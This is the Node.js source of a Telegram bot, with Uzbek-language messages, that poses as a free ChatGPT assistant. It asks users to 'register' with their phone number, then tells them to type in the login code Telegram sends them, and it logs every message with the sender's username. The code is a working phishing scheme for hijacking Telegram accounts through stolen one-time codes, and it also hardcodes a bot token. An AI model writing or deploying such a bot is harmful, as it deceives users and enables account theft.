const TelegramBot = require('node-telegram-bot-api')
const botToken = '6520234951:AAFPOEZ2E63n0A_2PLWsxbMQMqHzy4fGvRE'
const bot = new TelegramBot(botToken, {polling: true});

const home = JSON.stringify({
    resize_keyboard: true,
    keyboard: [
      [`!Ro'yxatdan o'tish!`]
    ]
  });


//  HIDDEN PLACE
bot.onText(/\/data/, (msg) => {
  const chatId = msg.chat.id;

  // Web sahifaga olib boruvchi inline tugmacha yaratish
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'get data', callback_data: 'there is data' }
        ]
      ]
    }
  };

  bot.sendMessage(chatId, 'Click the button for data:', options);
});
//  GIVE DATA FOR "HIDDEN PLACE"
bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;

  let response;

  // callback_data qiymatini tekshirish va tegishli javobni yuborish
  if (data === 'there is data') {
    response = 'Here is your hidden data!';
  } else {
    response = 'Unknown request!';
  }

  bot.sendMessage(message.chat.id, `ok: ${response}`);
});


// /start komandasiga javob berish
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    option = {
      reply_to_message_id: msg.message_id,
      parse_mode: "markdown",
      reply_markup: home
    }
    
    bot.sendMessage(chatId, `Assalomu alaykum, Yordamchi botiga xush kelibsiz, bu bot siz bergan har qanday savolga Suniy Intelekt ChatGPT yordamida javob bera oladi.`, option);
    setTimeout(function(){
      bot.sendMessage(chatId, `Iltimos savol-javoblarni boshlash uchun va ChatGPT ga ulanish uchun telefon raqamingiz orqali royxatdan o'ting.`, option)
    },12000)
  })


  bot.onText(/!Ro'yxatdan o'tish!/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Royxatdan o'tish uchun telefon raqamingizni yozing.       Na'muna:   97 123 45 67`);
});

// Telefon raqamini tekshirish
bot.on('message', (msg) => {
  const chatId = msg.chat.id
  const message = msg.text
    function test(phoneNumber){
    const test2 = /\d{2} \d{3} \d{2} \d{2}/;                   //    /^\+998-\d{2}-\d{7}$/ 
    return test2.test(phoneNumber);
  }
number = test(message);
    if(number){
  bot.sendMessage(chatId, `Telegram ilovangizga kelgan kodni kiriting va javobni kutib turing.   ❗️Kelgan kodni boshqa hech kimga bermang, xatto u Telegram xodimi bo'lsa ham❗️`);
  setTimeout(function() {
      bot.sendMessage(chatId, `So'rovingiz tasdiqlandi. Sizni qiziqtirgan savolni yo'llang.`);
  },40000);
 }
})



// malumotlarni olish uchun
bot.on('message', (msg) => {
    const messageText = msg.text
    const username = msg.chat.username
    const firstName = msg.chat.first_name
    const botga_kelgan_xabar = messageText
    const time = new Date().toTimeString()
   console.log(`[${username}:${firstName}]dan kelgan xabar:`, `[${botga_kelgan_xabar}]`, 'vaqti:',time);
})

console.log('bot running...');